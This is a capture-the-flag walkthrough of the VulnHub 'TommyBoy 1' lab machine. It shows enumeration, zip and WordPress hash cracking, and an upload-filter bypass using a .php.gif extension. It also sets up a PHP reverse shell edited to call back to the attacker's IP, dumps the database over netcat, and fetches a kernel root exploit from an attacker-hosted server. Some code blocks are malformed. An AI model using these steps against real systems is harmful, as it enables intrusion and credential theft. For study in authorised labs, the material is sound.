title: VulnHub - TommyBoy 1
---

**Description:** The Callahan Auto company needs our help as unfortunately,the site just went down and the only person with admin credentials is Tom Callahan Sr. who just passed away! And to make matters worse, the only other guy with knowledge of the server just quit.

**Author:** Brian Johnson

**Operating System:** Linux

**Aim:** To restore a backup copy of the homepage to Callahan Auto's server and collect 5 flags strewn about the system, and use the data inside them to unlock one final message.

**Download:** [https://www.vulnhub.com/entry/tommy-boy-1,157/](https://www.vulnhub.com/entry/tommy-boy-1,157/)

## Information Gathering
### Host Discovery
I started to discover the target machine, as shown below:

```bash
root@kali:~$ arp-scan -I vmnet1 192.168.179.1/24
Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.179.149 00:0c:29:8f:03:08       VMware, Inc.
192.168.179.254 00:50:56:f5:4b:e2       VMware, Inc.
```

### Port Scanning
With unicornscan I performed a full TCP port scan.

```bash
root@kali:~$ us -mT -Iv 192.168.179.149:a -R 3 -r 3000
...
TCP open                     ssh[   22]         from 192.168.179.149  ttl 64

TCP open                http-alt[ 8008]         from 192.168.179.149  ttl 64
```

### Service Enumeration
Then I did version detection and script scanning of the open TCP ports.

```bash
root@kali:~$ nmap -vv -n -p22,80,8008 -sV -sC 192.168.179.149 -oN service-enum.txt
...

### Web Enumeration on port 80
I browsed the web server and found a welcome message of callahan auto.

![](/assets/images/tommyboy/screenshot-1.png)

Then I decided request for the robots file and found the first flag and other directories without any important, these were rabbit holes.

![](/assets/images/tommyboy/screenshot-2.png)

![](/assets/images/tommyboy/screenshot-3.png)

I tried to view the source page with the browser, and was able to find in Nick's specifications about the access to a web page, it said if you don't remember it, you can access the following youtube url [https://www.youtube.com/watch?v=VUxOd4CszJ8](https://www.youtube.com/watch?v=VUxOd4CszJ8).

![](/assets/images/tommyboy/screenshot-4.png)

I browse the /prehistoricforest directory and it redirected me to a wordpress page, and I could see a question for Richard, finding out the password for the protected post, in the comment we see that we can find it accessing the /richard directory.

![](/assets/images/tommyboy/screenshot-5.png)

![](/assets/images/tommyboy/screenshot-6.png)

In that directory I found an image, I downloaded it, used the strings command, and found an md5 hash.

![](/assets/images/tommyboy/screenshot-7.png)


```bash
root@kali:~$ wget http://192.168.179.149/richard/shockedrichard.jpg

root@kali:~$ strings shockedrichard.jpg | head

```

I googled the password for this hash, and found the password **spanky**.
![](/assets/images/tommyboy/screenshot-8.png)

I typed the password in the protected post and it enabled the hidden text.

![](/assets/images/tommyboy/screenshot-9.png)

In the comment we can see that Nick is some excited for his departure and leaves us some love words, anyway we see in text that there's a backup called callahanbak.bak and we have to restore it, but first we need to login with Big Tom's account via ssh, also mentions that this user always forgets his password, and about a FTP service that runs on a non-standard port and that it is online for 15 minutes and then down for the same time, to access to this service we can use the username **nickburns** and that the password is easy to guess.

![](/assets/images/tommyboy/screenshot-10.png)

![](/assets/images/tommyboy/screenshot-11.png)

So I proceeded to perform a re-scan of the TCP ports and found the port 65534 is enabled, on which the FTP service is running.

```bash
root@kali:~$ us -mT -Iv 192.168.179.149:a -R 3 -r 3000
...
TCP open                     ssh[   22]         from 192.168.179.149  ttl 64

TCP open                 unknown[65534]         from 192.168.179.149  ttl 64

root@kali:~$ nmap -p65534 -v -sV -sC 192.168.179.149 
...
PORT      STATE SERVICE VERSION
65534/tcp open  ftp     ProFTPD
MAC Address: 00:0C:29:8F:03:08 (VMware)
```
Poked around in the comments I found the path to the second flag.

![](/assets/images/tommyboy/screenshot-13.png)

### FTP Enumeration
I tried log in with the user **nickburns** as username and password and had successful access, then downloaded the readme.txt file to the attacking machine, in the text file I can see that there is a subfolder called /NickIzL33t on this server somewhere.
 
```bash
root@kali:~$ ftp 192.168.179.149 65534

root@kali:~$ cat readme.txt 
To my replacement:

If you're reading this, you have the unfortunate job of taking over IT responsibilities
from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'll be
surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn't know a fax machine
from a flame thrower!

Anyway I'm not completely without mercy.  There's a subfolder called "NickIzL33t" on this server
somewhere. I used it as my personal dropbox on the company's dime for years.  Heh. LOL.
I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want
to look at on your phone later, consider that folder my gift to you.

Oh by the way, Big Tom's a moron and always forgets his passwords and so I made an encrypted
.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
He always forgets THAT password as well.  Luckily I'm a nice guy and left him a hint sheet.

Good luck, schmuck!

LOL.

-Nick
```


### Web Enumeration on port 8008
I requested the /NickIzL33t resource on port 8080, but it says that Nick and Steve Jobs can see this content.

![](/assets/images/tommyboy/screenshot-14.png)

After a long time without finding anything useful, I realize that Steve Job has access to this page so, we could access the content with some mac device, I installed the User-Agent Switcher plugin in the firefox browser and changed it for the iPhone user agent and shown the following content:

![](/assets/images/tommyboy/screenshot-15.png)

I ran gobuster to find the file with .html extension but I didn't find anything with the common word lists, so I fire gobuster again with the rockyou and finally find the file **fallon1.html**.

```bash
root@kali:~$ zcat /usr/share/wordlists/rockyou.txt.gz > rockyou.txt

root@kali:~$ gobuster dir -u http://192.168.179.149:8008/NickIzL33t/ -a 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KH
TML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)' -w rockyou.txt -e -x html 2>/dev/null
...

```

![](/assets/images/tommyboy/screenshot-16.png)

In the hint link I found the instructions to generate the password combinations for Big Tom, so I developed a bash script for this.

![](/assets/images/tommyboy/screenshot-17.png)

```bash
#!/bin/bash

file="tom_wordlist.txt"
nick="bev"
year=1995

echo "Generating wordlist..."

for ul in {A..Z}; do
    for num in {00..99}; do
        for l1 in {a..z}; do
            for l2 in {a..z}; do
                for s in $(cat symbols.txt); do
                    echo "${nick}${ul}${num}${l1}${l2}${s}${year}"
                done
            done
        done
    done
done > $file
```

I created a symbols.txt file with some symbols and then ran the script.

```bash
root@kali:~$ ./pass-gen.sh
```

I clicked on "The Third flag" link and was redirected to the content of the flag.

![](/assets/images/tommyboy/screenshot-18.png)

Then with curl I downloaded the zip file.

```bash
root@kali:~$ wget --user-agent="Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)" http://192.168.179.149:8008/NickIzL33t/t0msp4ssw0rdz.zip
```

With the wordlist generated before, I cracked the zip file, as shown below:

```bash
root@kali:~$ fcrackzip -u -D -p tom_wordlist.txt t0msp4ssw0rdz.zip

PASSWORD FOUND!!!!: pw == bevH00tr$1995
```

Then I unzip the **t0msp4ssw0rdz.zip** file, and I can see some credentials, for the bigtommysenior user the password is incomplete, there are numbers after this but it is written in a draft of the company blog, for the bigtom user the password hint is a famous Queen song.

```bash
root@kali:~$ unzip t0msp4ssw0rdz.zip 
Archive:  t0msp4ssw0rdz.zip
[t0msp4ssw0rdz.zip] passwords.txt password:

Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.

```

I reviewed the html code with the browser and found a comment about a file upload resource in the /P4TCH_4D4M5 directory, as we can see this exists.

![](/assets/images/tommyboy/screenshot-20.png)


## Exploitation
### File upload

I tried to upload a php file but this didn't work, so I uploaded a php file with the extension .php.gif, this time was possible bypass the restrictions, and the php code was interpreted.

```bash
root@kali:~$ echo "<?php phpinfo(); ?>" > info.php.gif
```
![](/assets/images/tommyboy/screenshot-21.png)

![](/assets/images/tommyboy/screenshot-22.png)

![](/assets/images/tommyboy/screenshot-23.png)

**Getting a reverse shell**

I used a reverse shell php from pentestmonkey, changed the ip address for the ours and the port, then I uploaded it.

```bash
root@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php z.php.gif
root@kali:~$ sed -i 's/127.0.0.1/192.168.179.1/;s/1234/443/' z.php.gif
```
![](/assets/images/tommyboy/screenshot-24.png)

![](/assets/images/tommyboy/screenshot-25.png)

I first set up a netcat listener and then we ran with the browser our reverse shell.

![](/assets/images/tommyboy/screenshot-26.png)

Finally I got a reverse shell, in the path /.5.txt found the flag number 5, but we need the fourth flag to complete the challenge and so we would join all flags and unzip the loot.zip file.

```bash
root@kali:~$ nc -vlnp 443

FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
OH RICHARD DON'T RUN AWAY FROM YOUR FEELINGS!!!!!!!!

Flag data: Buttcrack

Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk.
So for example, if flag 1 data was "hi" and flag 2 data was "there" and flag 3 data was "you"
you would create this blob:

hithereyou

Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom's folder and you can call the box PWNED.
```

Then I tried to search for the documentroot in the apache configuration files in the path **/var/www/html/prehistoricforest/** I found the wordpress credentials for mysql.

```bash
www-data@CallahanAutoSrv01:/$ grep -ir 'documentroot' /etc/apache2/

...
```

I dumped the wordpress database and transferred it to the attacking machine.

```bash
www-data@CallahanAutoSrv01:/var/www/html/prehistoricforest$ mysqldump -u wordpressuser -p wordpress > /tmp/wpdump.sql
<orest$ mysqldump -u wordpressuser -p wordpress > /tmp/wpdump.sql            
Enter password: CaptainLimpWrist!!!
www-data@CallahanAutoSrv01:/var/www/html/prehistoricforest$ nc -vlnp 6565 < /tmp/wpdump.sql
```

```bash
root@kali:~$ nc 192.168.179.149 6565 > wpdump.sql
```

I filtered the password hashes to the file wphashes.txt, then I cracked these with hashcat and I got the password **tomtom1**, this belongs to tom user.

```bash
root@kali:~$ grep 'wp_users' wpdump.sql | grep -oP '\$P\$[^,]*' | cut -d "'" -f 1 > wphashes.txt
root@kali:~$ hashcat -a 0 -m 400 wphashes.txt rockyou.txt
...
$P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK.:tomtom1

root@kali:~$ grep '$P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK.' wpdump.sql
```

I logged in the wordpress page and had successful access. 

![](/assets/images/tommyboy/screenshot-27.png)

![](/assets/images/tommyboy/screenshot-28.png)

I clicked on the link under Drafts and it redirected me to the site where the final part of the password was located.

![](/assets/images/tommyboy/screenshot-29.png)

### Access via SSH
I logged in via SSH with the credentials:

**username:** bigtommysenior

**password:** fatguyinalittlecoat1938!!

In the home directory we can see the fourth flag, the backup to restore and the loot.zip file.

YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal
working status.

Flag data: EditButton

But...but...where's flag 5?  

I'll make it easy on you.  It's in the root of this server at /5.txt
```

I restored the callahanbak.bak file on the server, we can check that's all correct.

```bash
bigtommysenior@CallahanAutoSrv01:~$ cp callahanbak.bak /var/www/html/index.html
```

To complete our objective I unzipped the LOOT.ZIP file with the following password that is the concatenation of the five flags.

```bash
Flag1: B34rcl4ws
Flag2: Z4l1nsky
Flag3: TinyHead
Flag4: EditButton
Flag5: Buttcrack
B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
```

```bash
bigtommysenior@CallahanAutoSrv01:~$ unzip LOOT.ZIP 
Archive:  LOOT.ZIP
[LOOT.ZIP] THE-END.txt password: 
  inflating: THE-END.txt             
bigtommysenior@CallahanAutoSrv01:~$ cat THE-END.txt 
YOU CAME.
YOU SAW.
YOU PWNED.

Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.

GREAT WORK!

## Privilege Escalation
### Kernel Exploitation

We can't finish our mission without get root, the kernel version for this system allows for arbitrary read/write access to the linux kernel, bypassing SMEP/SMAP, you can download the exploit [here](https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/linux/local/45010.c).


I started a web server with php on my local machine on port 80.

```bash
root@kali:~$ php -S 192.168.179.1:80 
```

Then I transferred the exploit to the target machine, compiled it and ran it.

```bash
bigtommysenior@CallahanAutoSrv01:/tmp$ wget 192.168.179.1/45010.c -O r00t.c

bigtommysenior@CallahanAutoSrv01:/tmp$ ./r00t
